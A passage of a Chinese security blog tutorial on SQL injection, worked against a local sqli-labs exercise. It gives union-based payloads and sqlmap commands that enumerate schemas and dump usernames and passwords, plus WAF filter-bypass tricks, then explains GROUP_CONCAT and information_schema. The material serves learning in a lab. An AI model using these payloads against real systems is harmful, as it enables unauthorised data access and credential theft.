+<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129145759615.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129145759615.png" alt="image-20240129145759615"></a></p>
+<p>(3)构造联合查询确定显示位置</p>
+<p>Union select：让原有查询语句为假，使拼合后的union select为真</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129150150075.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129150150075.png" alt="image-20240129150150075"></a></p>
+<p>确定Your Login name在2位置回显，Your Password在3位置回显。</p>
+<p>4.<strong>联合查询（Union-Based）：</strong></p>
+<ul>
+<li>如果目标是从数据库中检索数据，尝试使用UNION语句合并额外的查询结果。</li>
+</ul>
+<p>(1)查询当前数据库</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> database();</span><br><span class="line">#注意作为拼接语句时要去掉分号，作为完整语句时要加上分号</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129151212158.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129151212158.png" alt="image-20240129151212158"></a></p>
+<p>(2)查询所有的数据库</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129151347797.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129151347797.png" alt="image-20240129151347797"></a></p>
+<p>(3)查询security的所有表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> &quot;security&quot; limit <span class="number">0</span>,<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> &quot;security&quot;;</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129151430020.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129151430020.png" alt="image-20240129151430020"></a></p>
+<p>(4)查询users的所有字段</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> table_schema <span class="operator">=</span> &quot;security&quot; <span class="keyword">and</span> table_name<span class="operator">=</span>&quot;users&quot; limit <span class="number">0</span>,<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> table_schema <span class="operator">=</span> &quot;security&quot; <span class="keyword">and</span> table_name<span class="operator">=</span>&quot;users&quot;;</span><br></pre></td></tr></table></figure>
+<p>给出一个完整URL实例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:23334/Less-2/?id=-1%20union select 1,(select group_concat(column_name) from information_schema.COLUMNS where table_schema = &quot;security&quot; and table_name=&quot;users&quot;),3</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129151455784.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129151455784.png" alt="image-20240129151455784"></a></p>
+<p>(5)查询security.user的所有数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(username,<span class="string">&#x27;:&#x27;</span>,password,<span class="string">&#x27;&lt;/br&gt;&#x27;</span>) <span class="keyword">from</span> users</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129151556998.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129151556998.png" alt="image-20240129151556998"></a></p>
+<h4 id="2-利用自动化工具sqlmap注入">2.利用自动化工具sqlmap注入</h4>
+<p>(1)查询当前数据库</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># GET请求 </span></span><br><span class="line">sqlmap <span class="literal">-u</span> <span class="string">&quot;http://127.0.0.1:23334/Less-2/?id=1&quot;</span> <span class="literal">--current-db</span> </span><br><span class="line"><span class="comment"># POST请求 </span></span><br><span class="line">sqlmap <span class="literal">-r</span> POST_request.txt <span class="literal">--current-db</span></span><br></pre></td></tr></table></figure>
+<p>POST_request.txt为bp抓包获得的一个POST请求数据包</p>
+<p>如果无法抓取127.0.0.1发送的数据包，可将本机地址改为局域网内地址，地址在cmd的ipconfig中获取。</p>
+<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129151954532.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129151954532.png" alt="image-20240129151954532"></a></p>
+<p>(2)查询所有数据库</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># GET请求 </span></span><br><span class="line">sqlmap <span class="literal">-u</span> “http://<span class="number">192.168</span>.<span class="number">52.130</span>:<span class="number">8081</span>/Less<span class="literal">-2</span>/?id=<span class="number">1</span>” <span class="literal">--dbs</span> </span><br><span class="line"><span class="comment"># POST请求 </span></span><br><span class="line">sqlmap <span class="literal">-r</span> POST_request.txt <span class="literal">--dbs</span></span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129152029695.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129152029695.png" alt="image-20240129152029695"></a></p>
+<p>(3)查询security所有表单</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># GET请求 </span></span><br><span class="line">sqlmap <span class="literal">-u</span> <span class="string">&quot;http://127.0.0.1:23334/Less-2/?id=1&quot;</span> <span class="literal">-D</span> security <span class="literal">--tables</span> </span><br><span class="line"><span class="comment"># POST请求 </span></span><br><span class="line">sqlmap <span class="literal">-r</span> POST_request.txt <span class="literal">-D</span> security <span class="literal">--tables</span></span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129152153927.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129152153927.png" alt="image-20240129152153927"></a></p>
+<p>(4)查询security.users的所有字段</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># GET请求 </span></span><br><span class="line">sqlmap <span class="literal">-u</span> <span class="string">&quot;http://127.0.0.1:23334/Less-2/?id=1&quot;</span> <span class="literal">-D</span> security <span class="literal">-T</span> users <span class="literal">--columns</span> </span><br><span class="line"><span class="comment"># POST请求 </span></span><br><span class="line">sqlmap <span class="literal">-r</span> POST_request.txt <span class="literal">-D</span> security <span class="literal">-T</span> users <span class="literal">--columns</span></span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129152224958.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129152224958.png" alt="image-20240129152224958"></a></p>
+<p>(5)查询security.users的所有数据</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># GET请求 </span></span><br><span class="line">sqlmap <span class="literal">-u</span> <span class="string">&quot;http://127.0.0.1:23334/Less-2/?id=1&quot;</span> <span class="literal">-D</span> security <span class="literal">-T</span> users <span class="literal">-C</span> id,username,password <span class="literal">--dump</span> </span><br><span class="line"><span class="comment"># POST请求 </span></span><br><span class="line">sqlmap <span class="literal">-r</span> POST_request.txt <span class="literal">-D</span> security <span class="literal">-T</span> users <span class="literal">-C</span> id,username,password <span class="literal">--dump</span></span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129152338623.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129152338623.png" alt="image-20240129152338623"></a></p>
+<h3 id="SQL注入字符的绕过">SQL注入字符的绕过</h3>
+<ul>
+<li>
+<h4 id="双写绕过">双写绕过</h4>
+</li>
+</ul>
+<p>例如过滤了&quot;order by&quot;中的or，可以使用“oorrder by”双写绕过，中间的or会被正则表达式过滤删除，然后拼接得到一个新的order by</p>
+<ul>
+<li>
+<h4 id="空格替换">空格替换</h4>
+</li>
+</ul>
+<p>可以使用 <code>%0A + /**/ </code>替换空格，%20通常会被直接判定为空格故此处不写</p>
+<ul>
+<li>
+<h4 id="Union-Select绕过">Union Select绕过</h4>
+</li>
+</ul>
+<p>使用<code>union all select</code>进行替换</p>
+<ul>
+<li>
+<h4 id="大小写绕过">大小写绕过</h4>
+</li>
+</ul>
+<h3 id="附加知识">附加知识</h3>
+<h4 id="1-group-concat-聚合查询函数">1.group_concat()聚合查询函数</h4>
+<p><code>GROUP_CONCAT()</code> 函数是用于将每个分组中的值连接成一个字符串的聚合函数。它通常用于与<code>GROUP BY</code>子句一起使用，将每个分组中的多个行合并成一个字符串。该函数在多种关系型数据库系统中都有支持，如MySQL、SQLite、PostgreSQL等。</p>
+<h5 id="原理：">原理：</h5>
+<p><code>GROUP_CONCAT()</code> 函数的原理是对每个分组中的数据进行连接，形成一个包含所有值的字符串。连接的顺序通常由数据库引擎内部决定，而且可能不是特定的顺序。</p>
+<h5 id="使用方法：">使用方法：</h5>
+<h5 id="MySQL示例：">MySQL示例：</h5>
+<p>假设有一个表 <code>employees</code>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">+</span><span class="comment">----+---------+--------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name    <span class="operator">|</span> dept   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+---------+--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>  <span class="operator">|</span> Alice   <span class="operator">|</span> HR     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2</span>  <span class="operator">|</span> Bob     <span class="operator">|</span> IT     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">3</span>  <span class="operator">|</span> Charlie <span class="operator">|</span> HR     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">4</span>  <span class="operator">|</span> David   <span class="operator">|</span> IT     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+---------+--------+</span></span><br></pre></td></tr></table></figure>
+<p>我们想按部门分组，将每个部门的员工名字连接成一个字符串。可以使用 <code>GROUP_CONCAT()</code> 函数实现：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> dept, GROUP_CONCAT(name <span class="keyword">ORDER</span> <span class="keyword">BY</span> id SEPARATOR <span class="string">&#x27;, &#x27;</span>) <span class="keyword">AS</span> employee_list</span><br><span class="line"><span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> dept;</span><br></pre></td></tr></table></figure>
+<p>上述查询将输出每个部门以及该部门下员工的名字连接成的字符串：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">+</span><span class="comment">--------+---------------------+</span></span><br><span class="line"><span class="operator">|</span> dept   <span class="operator">|</span> employee_list       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+---------------------+</span></span><br><span class="line"><span class="operator">|</span> HR     <span class="operator">|</span> Alice, Charlie      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> IT     <span class="operator">|</span> Bob, David          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+---------------------+</span></span><br></pre></td></tr></table></figure>
+<p>在这个例子中，<code>GROUP_CONCAT(name ORDER BY id SEPARATOR ', ')</code> 表示按照 <code>id</code> 的顺序连接每个部门的员工名字，并使用逗号和空格作为分隔符。你也可以根据需要更改分隔符、排序规则等。</p>
+<h4 id="2-information-schema数据库">2.information_schema数据库</h4>
+<p><code>information_schema</code> 是一个特殊的数据库，它包含了关于数据库服务器、数据库、表、列、索引、权限等元数据（metadata）的信息。这些信息以表格的形式存储，允许用户查询和了解数据库服务器的内部结构、配置和状态。</p>
+<p>以下是 <code>information_schema</code> 数据库的一些常见用途：</p>
+<ol>
+<li><strong>元数据查询：</strong>
+<ul>
+<li>可以通过 <code>information_schema</code> 数据库中的表，如 <code>TABLES</code>、<code>COLUMNS</code>、<code>INDEXES</code>，来获取关于数据库中的表、列和索引的元数据信息。</li>
+</ul>
+</li>
+<li><strong>权限查询：</strong>
+<ul>
+<li>使用 <code>information_schema</code> 数据库的 <code>USER_PRIVILEGES</code> 表，可以查询用户和角色的权限信息。</li>
+</ul>
+</li>
+<li><strong>数据库和表的配置信息：</strong>
+<ul>
+<li>查询 <code>SCHEMATA</code> 表和 <code>TABLES</code> 表，可以获取有关数据库和表的配置信息，如字符集、排序规则等。</li>
+</ul>
+</li>
+<li><strong>表约束查询：</strong>
+<ul>
+<li>使用 <code>KEY_COLUMN_USAGE</code> 表，可以查询有关表的主键、外键等约束信息。</li>
+</ul>
+</li>
+<li><strong>视图和存储过程查询：</strong>
+<ul>
+<li>通过查询 <code>VIEWS</code> 表和 <code>ROUTINES</code> 表，可以获取关于数据库中的视图和存储过程的信息。</li>
+</ul>
+</li>
+<li><strong>查询执行计划：</strong>
+<ul>
+<li>查询 <code>PROCESSLIST</code> 表可以获取有关当前执行的查询的信息，包括查询语句、执行时间等。</li>
+</ul>
+</li>
+<li><strong>查询服务器配置信息：</strong>
+<ul>
+<li>查询 <code>GLOBAL_VARIABLES</code> 表和 <code>SESSION_VARIABLES</code> 表，可以获取有关数据库服务器全局配置和当前会话配置的信息。</li>
+</ul>
+</li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://c3ngh.top">C3ngH</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://c3ngh.top/2024/01/29/SQLinjection/">http://c3ngh.top/2024/01/29/SQLinjection/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://c3ngh.top" target="_blank">C3ngH's B10g</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a></div><div class="post_share"><div class="social-share" data-image="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/02/02/CrossSiteScripting/" title="XSS注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">XSS注入</div></div></a></div><div class="next-post pull-right"><a href="/2024/01/10/WSL/" title="WSL配置"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">WSL配置</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/02/02/CrossSiteScripting/" title="XSS注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-02</div><div class="title">XSS注入</div></div></a></div><div><a href="/2024/02/14/FileInclude/" title="文件包含"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-14</div><div class="title">文件包含</div></div></a></div><div><a href="/2024/02/14/FileUpload/" title="文件上传"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-14</div><div class="title">文件上传</div></div></a></div><div><a href="/2024/05/25/RCE/" title="RCE（重构版）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-25</div><div class="title">RCE（重构版）</div></div></a></div><div><a href="/2024/03/18/PHPunserialize/" title="PHP反序列化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-18</div><div class="title">PHP反序列化</div></div></a></div><div><a href="/2024/02/04/XSSWriteUp/" title="XSSWriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-04</div><div class="title">XSSWriteUp</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">C3ngH</div><div class="author-info__description">允许一切如其所是</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/zch050217"><i class="fab fa-github"></i><span>关注作者</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/zch050217" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:zch050217@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%A6%82%E5%BF%B5%E5%92%8C%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.</span> <span class="toc-text">SQL注入漏洞概念和危害</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">概念：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B3%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">危害：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">2.</span> <span class="toc-text">SQL注入漏洞的修复建议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8prepare%E8%AF%AD%E5%8F%A5%E8%BF%9B%E8%A1%8C%E9%A2%84%E7%BC%96%E8%AF%91"><span class="toc-number">2.1.</span> <span class="toc-text">1.使用prepare语句进行预编译</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8PDO%EF%BC%9A"><span class="toc-number">2.1.1.</span> <span class="toc-text">(1)使用PDO：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8MySQLi%EF%BC%9A"><span class="toc-number">2.1.2.</span> <span class="toc-text">(2)使用MySQLi：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%9C%A8Java%E4%B8%AD%E4%BD%BF%E7%94%A8"><span class="toc-number">2.2.</span> <span class="toc-text">2.在Java中使用#{}</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="toc-number">2.3.</span> <span class="toc-text">SQL注释符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.4.</span> <span class="toc-text">SQL注入漏洞类型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%B8%83%E5%B0%94%E5%9E%8B%EF%BC%9Aand-1-1%E6%88%96%E8%80%85-and-1-2"><span class="toc-number">2.4.1.</span> <span class="toc-text">1. 布尔型：and 1&#x3D;1或者 and 1&#x3D;2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%8A%A5%E9%94%99%E5%9E%8B%EF%BC%9A"><span class="toc-number">2.4.2.</span> <span class="toc-text">2. 报错型：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%97%B6%E9%97%B4%E5%9E%8B%EF%BC%9A"><span class="toc-number">2.4.3.</span> <span class="toc-text">3.时间型：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">2.4.4.</span> <span class="toc-text">4.二次注入：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8"><span class="toc-number">2.5.</span> <span class="toc-text">SQL注入利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-number">2.5.1.</span> <span class="toc-text">1.手工注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7sqlmap%E6%B3%A8%E5%85%A5"><span class="toc-number">2.5.2.</span> <span class="toc-text">2.利用自动化工具sqlmap注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">2.6.</span> <span class="toc-text">SQL注入字符的绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.6.1.</span> <span class="toc-text">双写绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E6%9B%BF%E6%8D%A2"><span class="toc-number">2.6.2.</span> <span class="toc-text">空格替换</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Union-Select%E7%BB%95%E8%BF%87"><span class="toc-number">2.6.3.</span> <span class="toc-text">Union Select绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.6.4.</span> <span class="toc-text">大小写绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%84%E5%8A%A0%E7%9F%A5%E8%AF%86"><span class="toc-number">2.7.</span> <span class="toc-text">附加知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-group-concat-%E8%81%9A%E5%90%88%E6%9F%A5%E8%AF%A2%E5%87%BD%E6%95%B0"><span class="toc-number">2.7.1.</span> <span class="toc-text">1.group_concat()聚合查询函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">2.7.1.1.</span> <span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-number">2.7.1.2.</span> <span class="toc-text">使用方法：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MySQL%E7%A4%BA%E4%BE%8B%EF%BC%9A"><span class="toc-number">2.7.1.3.</span> <span class="toc-text">MySQL示例：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-information-schema%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">2.7.2.</span> <span class="toc-text">2.information_schema数据库</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/14/SomeWriteUp/" title="一些WriteUp">一些WriteUp</a><time datetime="2024-07-14T01:59:30.000Z" title="发表于 2024-07-14 09:59:30">2024-07-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/25/RCE/" title="RCE（重构版）">RCE（重构版）</a><time datetime="2024-05-25T03:03:50.000Z" title="发表于 2024-05-25 11:03:50">2024-05-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/25/rkwg3/" title="广域通信网">广域通信网</a><time datetime="2024-05-25T03:00:15.000Z" title="发表于 2024-05-25 11:00:15">2024-05-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/16/MiscLearn/" title="MiscLearn">MiscLearn</a><time datetime="2024-05-16T03:10:19.000Z" title="发表于 2024-05-16 11:10:19">2024-05-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/04/22/IDAuse/" title="IDA使用指南">IDA使用指南</a><time datetime="2024-04-22T14:11:05.000Z" title="发表于 2024-04-22 22:11:05">2024-04-22</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By C3ngH</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas 